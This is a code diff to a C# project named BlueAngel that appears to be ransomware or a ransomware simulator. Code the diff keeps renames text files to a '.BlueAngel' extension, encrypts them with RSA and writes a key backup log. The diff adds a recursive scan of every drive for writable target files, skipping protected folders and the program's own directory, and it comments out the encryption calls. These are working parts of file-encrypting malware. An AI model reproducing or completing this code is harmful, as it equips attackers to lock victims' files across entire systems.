@@ -119,13 +119,78 @@ namespace BlueAngel
         /// File System Interactions
         /// </summary>
         /// 
+        public List<string> TargetFilePaths;
+        // Sequence of file extensions to scan for
+        public string TargetFileExtensions;
+        // Number of target files found on the system
+        public int TargetFileFound;
         BlueAngel.CurrentUserSecurity CurrentUser;
+
+        public bool HasPermissionOnFile(string path)
+        {
+            // this could be configured to have different results
+            if (this.CurrentUser.HasAccess(new DirectoryInfo(Path.GetDirectoryName(path)), FileSystemRights.Write))
+            {
+                return this.CurrentUser.HasAccess(new FileInfo(path), FileSystemRights.Modify);
+            }
+            else
+            {
+                return false;
+            }
+        }
+
+        private bool DirectoryToSkip(string path)
+        {
+            return path.StartsWith("C:\\$", StringComparison.OrdinalIgnoreCase);
+        }
 
         EncryptionOperation FileEncrypter = new EncryptionOperation();
 
+        /// Recursive scan of a directory tree, skip unaccessible files
+        /// Base method from: http://stackoverflow.com/a/12332773
+        public IEnumerable<string> Traverse(string rootDirectory)
+        {
+            IEnumerable<string> files = Enumerable.Empty<string>();
+            IEnumerable<string> directories = Enumerable.Empty<string>();
+            try
+            {
+                // Test for UnauthorizedAccessException.
+                var permission = new FileIOPermission(FileIOPermissionAccess.PathDiscovery, rootDirectory);
+                permission.Demand();
+
+                files = Directory.GetFiles(rootDirectory, this.TargetFileExtensions);
+                directories = Directory.GetDirectories(rootDirectory);
+            }
+            catch
+            {
+                // Ignore folder
+                rootDirectory = null;
+            }
+
+            foreach (var file in files)
+            {
+                FileAttributes fa = File.GetAttributes(file);
+                if (!fa.HasFlag(FileAttributes.Directory) && HasPermissionOnFile(file) && !DirectoryToSkip(file))
+                {
+                    yield return file;
+                }
+            }
+
+            // Recursive call for SelectMany.
+            var subdirectoryItems = directories.SelectMany(Traverse);
+            foreach (var result in subdirectoryItems)
+            {
+                FileAttributes fa = File.GetAttributes(result);
+                if (!fa.HasFlag(FileAttributes.Directory) && HasPermissionOnFile(result) && !DirectoryToSkip(result))
+                {
+                    yield return result;
+                }
+            }
+        }
+
         public void WriteLog(string logMessage)
         {
-                    
+
             string exePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
 
             try
@@ -147,14 +212,14 @@ namespace BlueAngel
 
             string currentdatetime = (DateTime.Now.ToString("yyyy-dd-M-HH-mm-ss") + "-KEY.log");
             var keylogfile = File.Create(currentdatetime);
-            
+
             using (StreamWriter outputFile = new StreamWriter(keylogfile))
             {
                 outputFile.WriteLine("Welcome to your BlueAngel Key Backup Log File!");
                 outputFile.WriteLine("Private Key: " + privatekey);
                 outputFile.WriteLine("Public Key: " + publickey);
             }
-     
+
         }
 
         public void Log(string logMessage, TextWriter txtWriter)
@@ -181,8 +246,8 @@ namespace BlueAngel
             FileInfo[] Files = d.GetFiles("*.BlueAngel"); //Getting BlueAngel files
             return Files;
         }
-       
-        public FileInfo[] GetTXTFileCount (string path)
+
+        public FileInfo[] GetTXTFileCount(string path)
         {
             DirectoryInfo d = new DirectoryInfo(path);
             FileInfo[] Files = d.GetFiles("*.txt"); //Getting Txt files
@@ -199,7 +264,7 @@ namespace BlueAngel
             try
             {
                 System.IO.File.Move(file.Name, newfilename);
-                FileEncrypter.EncryptFileRSA(newfilefullname);
+                //FileEncrypter.EncryptFileRSA(newfilefullname);
             }
             catch
             {
@@ -211,7 +276,7 @@ namespace BlueAngel
         {
             DirectoryInfo d = new DirectoryInfo(path);
             FileInfo[] Files = d.GetFiles("*.txt"); //Getting Txt files
-            
+
             foreach (FileInfo file in Files)
             {
                 //Console.WriteLine(file.Name);
@@ -223,13 +288,13 @@ namespace BlueAngel
                 try
                 {
                     System.IO.File.Move(file.Name, newfilename);
-                    FileEncrypter.EncryptFileRSA(newfilefullname);
+                    //FileEncrypter.EncryptFileRSA(newfilefullname);
                 }
                 catch
                 {
                     //can't touch this
                 }
-                
+
 
             }
         }
@@ -242,7 +307,7 @@ namespace BlueAngel
             try
             {
                 System.IO.File.Move(file.Name, newfilename);
-                FileEncrypter.DecryptFileRSA(newfilefullname);
+                //FileEncrypter.DecryptFileRSA(newfilefullname);
 
             }
             catch
@@ -255,7 +320,7 @@ namespace BlueAngel
         {
             DirectoryInfo d = new DirectoryInfo(path);
             FileInfo[] Files = d.GetFiles("*.BlueAngel"); //Getting BlueAngel files
-            
+
             foreach (FileInfo file in Files)
             {
                 //Console.WriteLine(file.Name);
@@ -264,7 +329,7 @@ namespace BlueAngel
                 try
                 {
                     System.IO.File.Move(file.Name, newfilename);
-                    FileEncrypter.DecryptFileRSA(newfilefullname);
+                    //FileEncrypter.DecryptFileRSA(newfilefullname);
 
                 }
                 catch
@@ -275,9 +340,32 @@ namespace BlueAngel
             }
         }
 
+        private void Inspect(List<DriveInfo> drives)
+        {
+            long data = 0;
+            long counter = 0;
+
+            foreach (DriveInfo drive in drives)
+            {
+                string currentRoot = drive.RootDirectory.FullName;
+
+                foreach (string _filepath in Traverse(currentRoot))
+                {
+                    // Skip files related to this program
+                    if (_filepath.StartsWith(Path.GetFullPath(Environment.CurrentDirectory)))
+                    {
+                        continue;
+                    };
+
+                    if (HasPermissionOnFile(_filepath))
+                    {
+                        data += new FileInfo(_filepath).Length;
+                        counter++;
+                    }
+                }
+            }
+
+        }
+
     }
-
-
-
-
 }
